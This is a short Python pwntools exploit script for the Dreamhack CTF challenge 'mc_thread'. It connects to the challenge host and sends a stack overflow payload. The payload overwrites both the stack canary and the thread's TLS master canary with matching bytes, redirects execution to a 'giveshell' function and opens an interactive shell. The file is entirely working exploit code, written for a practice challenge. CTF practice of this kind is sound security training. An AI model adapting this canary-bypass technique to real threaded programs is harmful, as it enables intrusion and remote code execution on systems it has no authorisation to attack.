#!/usr/bin/env python3
# Name: mc_thread.py
from pwn import *
#p = process('./mc_thread')
p = remote('host3.dreamhack.games', 17043)
elf = ELF('./mc_thread')
payload = b'A' * 264
payload += b'A' * 8 # canary
payload += b'B' * 8
payload += p64(elf.symbols['giveshell'])
payload += b'C' * (0x910 - len(payload))
payload += p64(0x404800 - 0x972) # avoid SIGSEGV when self->canceltype = PTHREAD_CANCEL_DEFERRED
payload += b'C' * 0x10
payload += p64(0x4141414141414141) # master canary
inp_sz = len(payload) // 8
p.sendlineafter(b'Size: ', str(inp_sz).encode())
p.sendafter(b'Data: ', payload)
p.interactive()